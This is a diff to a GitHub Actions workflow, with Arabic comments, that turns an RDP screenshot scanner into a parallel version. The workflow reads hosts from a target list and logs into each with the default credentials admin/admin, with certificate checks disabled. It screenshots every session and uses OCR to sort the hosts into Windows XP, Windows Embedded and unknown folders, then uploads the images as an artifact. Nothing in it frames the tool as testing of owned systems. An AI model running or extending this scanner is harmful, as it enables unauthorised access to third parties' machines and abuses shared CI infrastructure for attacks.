@@ -1,11 +1,11 @@
-name: RDP Full Scanner (Custom Limit)
+name: RDP Pro Scanner (Parallel & OCR Sort)
 on: 
   workflow_dispatch:
     inputs:
       scan_limit:
-        description: 'عدد الأجهزة التي ترغب في فحصها من القائمة'
+        description: 'إجمالي الأجهزة للفحص'
         required: true
-        default: '5'
+        default: '20'
 
 jobs:
   capture-screens:
@@ -14,62 +14,71 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Install Dependencies
+      - name: Install Advanced Dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y freerdp2-x11 xvfb fluxbox scrot
+          sudo apt-get install -y freerdp2-x11 xvfb fluxbox scrot tesseract-ocr parallel
 
       - name: Setup Virtual Display
         run: |
-          # إنشاء شاشة وهمية
-          Xvfb :99 -screen 0 1280x1024x24 &
+          Xvfb :99 -screen 0 1600x1200x24 &
           echo "DISPLAY=:99" >> $GITHUB_ENV
 
-      - name: Run xfreerdp Scan
+      - name: Run Parallel Scan & OCR Sort
         run: |
           export DISPLAY=:99
-          fluxbox & # تشغيل مدير النوافذ لضمان ظهور الإطار الرسومي
+          fluxbox &
           sleep 3
-
-          # استخراج البورت الافتراضي
-          DEFAULT_PORT=$(grep "port=" nonla.txt | cut -d'=' -f2 || echo "3389")
           
-          # استخراج العدد المطلوب من المدخلات
+          # إنشاء المجلدات الأساسية
+          mkdir -p Results/Windows_XP Results/Windows_Embedded Results/Unknown Results/Failed
+
+          DEFAULT_PORT=$(grep "port=" nonla.txt | cut -d'=' -f2 || echo "3389")
           LIMIT=${{ github.event.inputs.scan_limit }}
-          echo "[*] Starting scan for the first $LIMIT targets..."
 
-          # قراءة الأسطر بناءً على العدد المحدد
-          grep -v "port=" nonla.txt | head -n "$LIMIT" | while read -r line || [ -n "$line" ]; do
-            [[ -z "$line" ]] && continue
+          # استخراج القائمة وتجهيزها للمعالجة المتوازية
+          grep -v "port=" nonla.txt | head -n "$LIMIT" > targets.tmp
+
+          # دالة الفحص والتصنيف
+          scan_and_sort() {
+            IP_PORT=$1
+            IP=$(echo $IP_PORT | cut -d':' -f1)
+            PORT=$(echo $IP_PORT | grep ":" && echo $IP_PORT | cut -d':' -f2 || echo "3389")
             
-            if [[ $line == *":"* ]]; then
-                IP=$(echo $line | cut -d':' -f1)
-                PORT=$(echo $line | cut -d':' -f2)
-            else
-                IP=$line
-                PORT=$DEFAULT_PORT
+            echo "[*] Testing: $IP"
+            
+            # تشغيل الفحص
+            timeout 45s xfreerdp /v:$IP:$PORT /cert:ignore /sec:any /size:1024x768 /u:admin /p:admin /network:auto -themes -wallpaper /audio-mode:2 &
+            PID=$!
+            sleep 30
+            
+            IMG_PATH="${IP}.png"
+            scrot "$IMG_PATH"
+            kill -9 $PID || true
+            
+            # التحقق من نجاح الصورة عبر OCR (نسبة تطابق وتحديد نوع)
+            if [ -f "$IMG_PATH" ]; then
+              # استخراج النص من الصورة
+              OCR_TEXT=$(tesseract "$IMG_PATH" stdout -l eng 2>/dev/null | tr '[:upper:]' '[:lower:]')
+              
+              if [[ "$OCR_TEXT" == *"windows xp"* ]]; then
+                mv "$IMG_PATH" Results/Windows_XP/
+              elif [[ "$OCR_TEXT" == *"embedded"* || "$OCR_TEXT" == *"posready"* ]]; then
+                mv "$IMG_PATH" Results/Windows_Embedded/
+              elif [[ -s "$IMG_PATH" ]]; then
+                mv "$IMG_PATH" Results/Unknown/
+              else
+                rm "$IMG_PATH"
+              fi
             fi
+          }
 
-            echo "[*] Connecting to $IP:$PORT..."
-            
-            # تصحيح صياغة الأمر: تم تغيير /gfx:off و /audio-mode لضمان التوافق
-            # تم إزالة +auth-only للسماح بظهور الشاشة
-            timeout 40s xfreerdp /v:$IP:$PORT /cert:ignore /sec:any /size:1024x768 /u:admin /p:admin /network:auto -themes -wallpaper /audio-mode:2 &
-            XFREE_PID=$!
-            
-            # انتظار تحميل الواجهة الرسومية
-            sleep 25
-            
-            # التقاط الصورة
-            scrot "${IP}_screen.png"
-            
-            # إنهاء العملية للانتقال للتالي
-            kill $XFREE_PID || kill -9 $XFREE_PID || true
-            sleep 2
-          done
-
-      - name: Upload Results
+          export -f scan_and_sort
+          # تشغيل 5 عمليات متوازية في نفس الوقت (Parallel 5)
+          cat targets.tmp | parallel -j 5 scan_and_sort
+          
+      - name: Upload Organized Results
         uses: actions/upload-artifact@v4
         with:
-          name: rdp-screenshots
-          path: "*.png"
+          name: Organized-RDP-Screens
+          path: Results/
